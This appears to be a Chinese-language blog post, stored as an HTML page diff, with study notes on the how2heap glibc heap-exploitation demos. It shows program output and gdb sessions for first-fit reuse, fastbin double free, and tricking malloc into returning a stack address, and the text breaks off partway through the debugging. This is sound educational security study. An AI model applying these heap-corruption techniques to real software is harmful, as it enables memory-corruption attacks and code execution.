@@ -1,0 +1,1158 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next muse" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,how2heap,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="giantbranch's blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="first_fit这个就是体验堆分配的策略，找到最合适的那个，这个uaf的漏洞利用提供了机会 12345678910111213141516171819root@kali:~/learn/how2heap# ./first_fit This file doesn&apos;t demonstrate an attack, but shows the nature of glibc&apos;s allocator.g">
+<meta name="keywords" content="pwn,how2heap">
+<meta property="og:type" content="article">
+<meta property="og:title" content="how2heap学习">
+<meta property="og:url" content="https://www.giantbranch.cn/2017/09/29/how2heap学习/index.html">
+<meta property="og:site_name" content="giantbranch&#39;s blog">
+<meta property="og:description" content="first_fit这个就是体验堆分配的策略，找到最合适的那个，这个uaf的漏洞利用提供了机会 12345678910111213141516171819root@kali:~/learn/how2heap# ./first_fit This file doesn&apos;t demonstrate an attack, but shows the nature of glibc&apos;s allocator.g">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1511510134573.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1511510134577.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1511510095522.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1511509778609.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1511509887058.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1511509947423.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1511509978375.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1511514026627.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1511516817177.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1511518758786.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1511679691574.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1511683728339.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1511690210646.jpg">
+<meta property="og:updated_time" content="2023-10-13T13:14:33.130Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="how2heap学习">
+<meta name="twitter:description" content="first_fit这个就是体验堆分配的策略，找到最合适的那个，这个uaf的漏洞利用提供了机会 12345678910111213141516171819root@kali:~/learn/how2heap# ./first_fit This file doesn&apos;t demonstrate an attack, but shows the nature of glibc&apos;s allocator.g">
+<meta name="twitter:image" content="http://pic.giantbranch.cn/pic/1511510134573.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://www.giantbranch.cn/2017/09/29/how2heap学习/">
+
+
+
+
+
+  <title>how2heap学习 | giantbranch's blog</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-121265336-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?e3a097ddc6964e154e65d478725ac9ed";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">giantbranch's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">忘掉掌声，按自己的方式，继续前行，跑过一生</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-book">
+          <a href="/book/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-book"></i> <br>
+            
+            读过的书
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.giantbranch.cn/2017/09/29/how2heap学习/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="giantbranch">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="giantbranch's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">how2heap学习</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-29T00:00:00+00:00">
+                2017-09-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/09/29/how2heap学习/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2017/09/29/how2heap学习/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="first-fit"><a href="#first-fit" class="headerlink" title="first_fit"></a>first_fit</h1><p>这个就是体验堆分配的策略，找到最合适的那个，这个uaf的漏洞利用提供了机会</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/learn/how2heap<span class="comment"># ./first_fit </span></span><br><span class="line">This <span class="built_in">file</span> doesn't demonstrate an attack, <span class="keyword">but</span> shows <span class="keyword">the</span> nature <span class="keyword">of</span> glibc's allocator.</span><br><span class="line">glibc uses a <span class="keyword">first</span>-fit algorithm <span class="keyword">to</span> select a free chunk.</span><br><span class="line">If a chunk <span class="keyword">is</span> free <span class="keyword">and</span> large enough, malloc will select this chunk.</span><br><span class="line">This can be exploited <span class="keyword">in</span> a use-<span class="keyword">after</span>-free situation.</span><br><span class="line">Allocating <span class="number">2</span> buffers. They can be large, don't have <span class="keyword">to</span> be fastbin.</span><br><span class="line"><span class="number">1</span>st malloc(<span class="number">512</span>): <span class="number">0x5567377d6420</span></span><br><span class="line"><span class="number">2</span>nd malloc(<span class="number">256</span>): <span class="number">0x5567377d6630</span></span><br><span class="line">we could <span class="keyword">continue</span> mallocing here...</span><br><span class="line">now let's <span class="keyword">put</span> a <span class="built_in">string</span> <span class="keyword">at</span> a <span class="keyword">that</span> we can <span class="built_in">read</span> later <span class="string">"this is A!"</span></span><br><span class="line"><span class="keyword">first</span> allocation <span class="number">0x5567377d6420</span> points <span class="keyword">to</span> this <span class="keyword">is</span> A!</span><br><span class="line">Freeing <span class="keyword">the</span> <span class="keyword">first</span> one...</span><br><span class="line">We don't need <span class="keyword">to</span> free anything again. As long <span class="keyword">as</span> we allocate <span class="keyword">less than</span> <span class="number">512</span>, <span class="keyword">it</span> will <span class="keyword">end</span> up <span class="keyword">at</span> <span class="number">0x5567377d6420</span></span><br><span class="line">So, let's allocate <span class="number">500</span> bytes</span><br><span class="line"><span class="number">3</span>rd malloc(<span class="number">500</span>): <span class="number">0x5567377d6420</span></span><br><span class="line">And <span class="keyword">put</span> a different <span class="built_in">string</span> here, <span class="string">"this is C!"</span></span><br><span class="line"><span class="number">3</span>rd allocation <span class="number">0x5567377d6420</span> points <span class="keyword">to</span> this <span class="keyword">is</span> C!</span><br><span class="line"><span class="keyword">first</span> allocation <span class="number">0x5567377d6420</span> points <span class="keyword">to</span> this <span class="keyword">is</span> C!</span><br><span class="line">If we reuse <span class="keyword">the</span> <span class="keyword">first</span> allocation, <span class="keyword">it</span> now holds <span class="keyword">the</span> data <span class="keyword">from</span> <span class="keyword">the</span> <span class="keyword">third</span> allocation.</span><br></pre></td></tr></table></figure>
+
+<h1 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h1><p>通过演示滥用fastbin freelist来欺骗malloc返回已分配的堆指针。<br>其实就是fastbin的double free</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root<span class="title">@kali</span>:~/learn/how<span class="number">2</span>heap# ./fastbin_dup </span><br><span class="line">This file demonstrates a simple <span class="keyword">double</span>-<span class="keyword">free</span> attack with fastbins.</span><br><span class="line">Allocating <span class="number">3</span> buffers.</span><br><span class="line"><span class="number">1</span>st <span class="keyword">malloc</span>(<span class="number">8</span>): <span class="number">0x5565d7d0b420</span></span><br><span class="line"><span class="number">2</span>nd <span class="keyword">malloc</span>(<span class="number">8</span>): <span class="number">0x5565d7d0b440</span></span><br><span class="line"><span class="number">3</span>rd <span class="keyword">malloc</span>(<span class="number">8</span>): <span class="number">0x5565d7d0b460</span></span><br><span class="line">Freeing the first <span class="keyword">one</span>...</span><br><span class="line">If we <span class="keyword">free</span> <span class="number">0x5565d7d0b420</span> again, things will crash because <span class="number">0x5565d7d0b420</span> is at the top of the <span class="keyword">free</span> list.</span><br><span class="line">So, instead, we'll <span class="keyword">free</span> <span class="number">0x5565d7d0b440</span>.</span><br><span class="line">Now, we can <span class="keyword">free</span> <span class="number">0x5565d7d0b420</span> again, since it's not the head of the <span class="keyword">free</span> list.</span><br><span class="line">Now the <span class="keyword">free</span> list has [ <span class="number">0x5565d7d0b420</span>, <span class="number">0x5565d7d0b440</span>, <span class="number">0x5565d7d0b420</span> ]. If we <span class="keyword">malloc</span> <span class="number">3</span> times, we'll get <span class="number">0x5565d7d0b420</span> twice!</span><br><span class="line"><span class="number">1</span>st <span class="keyword">malloc</span>(<span class="number">8</span>): <span class="number">0x5565d7d0b420</span></span><br><span class="line"><span class="number">2</span>nd <span class="keyword">malloc</span>(<span class="number">8</span>): <span class="number">0x5565d7d0b440</span></span><br><span class="line"><span class="number">3</span>rd <span class="keyword">malloc</span>(<span class="number">8</span>): <span class="number">0x5565d7d0b420</span></span><br></pre></td></tr></table></figure>
+
+<p>代码先free一次a，再free一次b，最后再free一次a，就把a给free了两次，最后在malloc三次，就将同一块内存分配了两次了</p>
+<p>那么我们直接free一次a，再free一次a会怎么样呢</p>
+<p>从下面可以看到直接退出了，可以看到检测到double free or corruption (fasttop): 0x000055f7d069e420 </p>
+<p>我们注意到fasttop这个单词，应该就是在fastbin的顶部检测到a被free了两次了</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/learn/how2heap# ./fastbin_dup2</span><br><span class="line">This file demonstrates a simple double-free attack with fastbins.</span><br><span class="line">Allocating <span class="number">3</span> buffers.</span><br><span class="line"><span class="number">1</span>st malloc(<span class="number">8</span>): <span class="number">0</span>x55f7d<span class="number">069e420</span></span><br><span class="line"><span class="number">2</span>nd malloc(<span class="number">8</span>): <span class="number">0</span>x55f7d<span class="number">069e440</span></span><br><span class="line"><span class="number">3</span>rd malloc(<span class="number">8</span>): <span class="number">0</span>x55f7d<span class="number">069e460</span></span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free <span class="number">0</span>x55f7d<span class="number">069e420</span> again, things will crash because <span class="number">0</span>x55f7d<span class="number">069e420</span> is at the top of the free list.</span><br><span class="line">*** Error in `./fastbin_dup2': double free or corruption (fasttop): <span class="number">0</span>x000055f7d<span class="number">069e420</span> ***</span><br><span class="line">======= Backtrace: =========</span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.<span class="number">6</span>(+<span class="number">0</span>x70bcb)[<span class="number">0</span>x7f7f4ea4dbcb]</span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.<span class="number">6</span>(+<span class="number">0</span>x76f96)[<span class="number">0</span>x7f7f4ea53f96]</span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.<span class="number">6</span>(+<span class="number">0</span>x7778e)[<span class="number">0</span>x7f7f4ea5478e]</span><br><span class="line">./fastbin_dup2(+<span class="number">0</span>x852)[<span class="number">0</span>x55f<span class="number">7d0205852</span>]</span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.<span class="number">6</span>(__libc_start_main+<span class="number">0</span>xf1)[<span class="number">0</span>x7f7f4e9fd2b1]</span><br><span class="line">./fastbin_dup2(+<span class="number">0</span>x67a)[<span class="number">0</span>x55f7d020567a]</span><br><span class="line">======= Memory map: ========</span><br><span class="line"><span class="number">55</span>f<span class="number">7d0205000</span>-<span class="number">55</span>f<span class="number">7d0206000</span> r-xp <span class="number">00000000 08</span>:<span class="number">01 2103960</span>                    /root/learn/how2heap/fastbin_dup2</span><br><span class="line"><span class="number">55</span>f<span class="number">7d0405000</span>-<span class="number">55</span>f<span class="number">7d0406000</span> r--p <span class="number">00000000 08</span>:<span class="number">01 2103960</span>                    /root/learn/how2heap/fastbin_dup2</span><br><span class="line"><span class="number">55</span>f<span class="number">7d0406000</span>-<span class="number">55</span>f<span class="number">7d0407000</span> rw-p <span class="number">00001000 08</span>:<span class="number">01 2103960</span>                    /root/learn/how2heap/fastbin_dup2</span><br><span class="line"><span class="number">55</span>f7d<span class="number">069e000</span>-<span class="number">55</span>f7d06bf000 rw-p <span class="number">00000000 00</span>:<span class="number">00</span> <span class="number">0</span>                          [heap]</span><br><span class="line"><span class="number">7</span>f<span class="number">7f48000000</span>-<span class="number">7</span>f<span class="number">7f48021000</span> rw-p <span class="number">00000000 00</span>:<span class="number">00</span> <span class="number">0</span> </span><br><span class="line"><span class="number">7</span>f<span class="number">7f48021000</span>-<span class="number">7</span>f7f<span class="number">4c000000</span> ---p <span class="number">00000000 00</span>:<span class="number">00</span> <span class="number">0</span> </span><br><span class="line"><span class="number">7</span>f7f<span class="number">4e7c6000</span>-<span class="number">7</span>f7f4e7dc000 r-xp <span class="number">00000000 08</span>:<span class="number">01 1443787</span>                    /lib/x86_64-linux-gnu/libgcc_s.so.<span class="number">1</span></span><br><span class="line"><span class="number">7</span>f7f4e7dc000-<span class="number">7</span>f7f4e9db000 ---p <span class="number">00016000 08</span>:<span class="number">01 1443787</span>                    /lib/x86_64-linux-gnu/libgcc_s.so.<span class="number">1</span></span><br><span class="line"><span class="number">7</span>f7f4e9db000-<span class="number">7</span>f7f4e9dc000 r--p <span class="number">00015000 08</span>:<span class="number">01 1443787</span>                    /lib/x86_64-linux-gnu/libgcc_s.so.<span class="number">1</span></span><br><span class="line"><span class="number">7</span>f7f4e9dc000-<span class="number">7</span>f7f4e9dd000 rw-p <span class="number">00016000 08</span>:<span class="number">01 1443787</span>                    /lib/x86_64-linux-gnu/libgcc_s.so.<span class="number">1</span></span><br><span class="line"><span class="number">7</span>f7f4e9dd000-<span class="number">7</span>f7f4eb72000 r-xp <span class="number">00000000 08</span>:<span class="number">01 1443750</span>                    /lib/x86_64-linux-gnu/libc-<span class="number">2</span>.<span class="number">24</span>.so</span><br><span class="line"><span class="number">7</span>f7f4eb72000-<span class="number">7</span>f7f4ed71000 ---p <span class="number">00195000 08</span>:<span class="number">01 1443750</span>                    /lib/x86_64-linux-gnu/libc-<span class="number">2</span>.<span class="number">24</span>.so</span><br><span class="line"><span class="number">7</span>f7f4ed71000-<span class="number">7</span>f7f4ed75000 r--p <span class="number">00194000 08</span>:<span class="number">01 1443750</span>                    /lib/x86_64-linux-gnu/libc-<span class="number">2</span>.<span class="number">24</span>.so</span><br><span class="line"><span class="number">7</span>f7f4ed75000-<span class="number">7</span>f7f4ed77000 rw-p <span class="number">00198000 08</span>:<span class="number">01 1443750</span>                    /lib/x86_64-linux-gnu/libc-<span class="number">2</span>.<span class="number">24</span>.so</span><br><span class="line"><span class="number">7</span>f7f4ed77000-<span class="number">7</span>f7f4ed7b000 rw-p <span class="number">00000000 00</span>:<span class="number">00</span> <span class="number">0</span> </span><br><span class="line"><span class="number">7</span>f7f4ed7b000-<span class="number">7</span>f7f4ed9e000 r-xp <span class="number">00000000 08</span>:<span class="number">01 1443722</span>                    /lib/x86_64-linux-gnu/ld-<span class="number">2</span>.<span class="number">24</span>.so</span><br><span class="line"><span class="number">7</span>f7f4ef79000-<span class="number">7</span>f7f4ef7b000 rw-p <span class="number">00000000 00</span>:<span class="number">00</span> <span class="number">0</span> </span><br><span class="line"><span class="number">7</span>f7f4ef9a000-<span class="number">7</span>f7f4ef9e000 rw-p <span class="number">00000000 00</span>:<span class="number">00</span> <span class="number">0</span> </span><br><span class="line"><span class="number">7</span>f7f4ef9e000-<span class="number">7</span>f7f4ef9f000 r--p <span class="number">00023000 08</span>:<span class="number">01 1443722</span>                    /lib/x86_64-linux-gnu/ld-<span class="number">2</span>.<span class="number">24</span>.so</span><br><span class="line"><span class="number">7</span>f7f4ef9f000-<span class="number">7</span>f7f4efa0000 rw-p <span class="number">00024000 08</span>:<span class="number">01 1443722</span>                    /lib/x86_64-linux-gnu/ld-<span class="number">2</span>.<span class="number">24</span>.so</span><br><span class="line"><span class="number">7</span>f7f4efa0000-<span class="number">7</span>f7f4efa1000 rw-p <span class="number">00000000 00</span>:<span class="number">00</span> <span class="number">0</span> </span><br><span class="line"><span class="number">7</span>fff<span class="number">98880000</span>-<span class="number">7</span>fff<span class="number">988a1000</span> rw-p <span class="number">00000000 00</span>:<span class="number">00</span> <span class="number">0</span>                          [stack]</span><br><span class="line"><span class="number">7</span>fff<span class="number">989d1000</span>-<span class="number">7</span>fff<span class="number">989d3000</span> r--p <span class="number">00000000 00</span>:<span class="number">00</span> <span class="number">0</span>                          [vvar]</span><br><span class="line"><span class="number">7</span>fff<span class="number">989d3000</span>-<span class="number">7</span>fff<span class="number">989d5000</span> r-xp <span class="number">00000000 00</span>:<span class="number">00</span> <span class="number">0</span>                          [vdso]</span><br><span class="line">ffffffffff600000-ffffffffff601000 r-xp <span class="number">00000000 00</span>:<span class="number">00</span> <span class="number">0</span>                  [vsyscall]</span><br><span class="line">已放弃</span><br></pre></td></tr></table></figure>
+
+<h1 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h1><p>通过滥用fastbin freelist，欺骗malloc返回一个近乎任意的指针。</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/learn/how2heap<span class="comment"># ./fastbin_dup_into_stack </span></span><br><span class="line">This <span class="built_in">file</span> extends <span class="keyword">on</span> fastbin_dup.c <span class="keyword">by</span> tricking malloc <span class="keyword">into</span></span><br><span class="line"><span class="keyword">returning</span> a pointer <span class="keyword">to</span> a controlled location (<span class="keyword">in</span> this case, <span class="keyword">the</span> stack).</span><br><span class="line">The address we want malloc() <span class="keyword">to</span> <span class="literal">return</span> <span class="keyword">is</span> <span class="number">0x7fff19d56580</span>.</span><br><span class="line">Allocating <span class="number">3</span> buffers.</span><br><span class="line"><span class="number">1</span>st malloc(<span class="number">8</span>): <span class="number">0x55a0bfdda420</span></span><br><span class="line"><span class="number">2</span>nd malloc(<span class="number">8</span>): <span class="number">0x55a0bfdda440</span></span><br><span class="line"><span class="number">3</span>rd malloc(<span class="number">8</span>): <span class="number">0x55a0bfdda460</span></span><br><span class="line">Freeing <span class="keyword">the</span> <span class="keyword">first</span> one...</span><br><span class="line">If we free <span class="number">0x55a0bfdda420</span> again, things will crash because <span class="number">0x55a0bfdda420</span> <span class="keyword">is</span> <span class="keyword">at</span> <span class="keyword">the</span> top <span class="keyword">of</span> <span class="keyword">the</span> free <span class="built_in">list</span>.</span><br><span class="line">So, instead, we'll free <span class="number">0x55a0bfdda440</span>.</span><br><span class="line">Now, we can free <span class="number">0x55a0bfdda420</span> again, <span class="keyword">since</span> <span class="keyword">it</span>'s <span class="keyword">not</span> <span class="keyword">the</span> head <span class="keyword">of</span> <span class="keyword">the</span> free <span class="built_in">list</span>.</span><br><span class="line">Now <span class="keyword">the</span> free <span class="built_in">list</span> has [ <span class="number">0x55a0bfdda420</span>, <span class="number">0x55a0bfdda440</span>, <span class="number">0x55a0bfdda420</span> ]. We'll now carry out our attack <span class="keyword">by</span> modifying data <span class="keyword">at</span> <span class="number">0x55a0bfdda420</span>.</span><br><span class="line"><span class="number">1</span>st malloc(<span class="number">8</span>): <span class="number">0x55a0bfdda420</span></span><br><span class="line"><span class="number">2</span>nd malloc(<span class="number">8</span>): <span class="number">0x55a0bfdda440</span></span><br><span class="line">Now <span class="keyword">the</span> free <span class="built_in">list</span> has [ <span class="number">0x55a0bfdda420</span> ].</span><br><span class="line">Now, we have access <span class="keyword">to</span> <span class="number">0x55a0bfdda420</span> <span class="keyword">while</span> <span class="keyword">it</span> remains <span class="keyword">at</span> <span class="keyword">the</span> head <span class="keyword">of</span> <span class="keyword">the</span> free <span class="built_in">list</span>.</span><br><span class="line">so now we are writing a fake free size (<span class="keyword">in</span> this case, <span class="number">0x20</span>) <span class="keyword">to</span> <span class="keyword">the</span> stack,</span><br><span class="line">so <span class="keyword">that</span> malloc will think there <span class="keyword">is</span> a free chunk there <span class="keyword">and</span> agree <span class="keyword">to</span></span><br><span class="line"><span class="built_in">return</span> a pointer <span class="keyword">to</span> <span class="keyword">it</span>.</span><br><span class="line">Now, we overwrite <span class="keyword">the</span> <span class="keyword">first</span> <span class="number">8</span> bytes <span class="keyword">of</span> <span class="keyword">the</span> data <span class="keyword">at</span> <span class="number">0x55a0bfdda420</span> <span class="keyword">to</span> point right <span class="keyword">before</span> <span class="keyword">the</span> <span class="number">0x20</span>.</span><br><span class="line"><span class="number">3</span>rd malloc(<span class="number">8</span>): <span class="number">0x55a0bfdda420</span>, putting <span class="keyword">the</span> stack address <span class="keyword">on</span> <span class="keyword">the</span> free <span class="built_in">list</span></span><br><span class="line"><span class="number">4</span>th malloc(<span class="number">8</span>): <span class="number">0x7fff19d56580</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到最终分配返回的已经不是堆变量，而是一个栈的地址，那么我们就有可能去覆盖栈上的东西，比如最经典的返回地址</p>
+<p>那么是怎么覆盖的呢，一开始free  a b a的顺序构造出了下面这样的free list</p>
+<p>[ 0x55a0bfdda420, 0x55a0bfdda440, 0x55a0bfdda420 ]</p>
+<p>我们调试看看（由于多次调试地址有所改变，但左后的一个字节应该是不变的），我们看到了我们分配的堆，我们看到fd已经有值了，但是为什么头部仍是0x21，最低位是1（后来问别人fastbin的这个位永远是1）</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heap</span><br><span class="line">Arena(s) found:</span><br><span class="line">  arena @ <span class="number">0</span>x7ffff7dd3b00</span><br><span class="line">gdb-peda$ x /<span class="number">20</span>gx <span class="number">0</span>x7ffff7dd3b00</span><br><span class="line"><span class="number">0</span>x7ffff7dd3b00 &lt;main_arena&gt;:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span 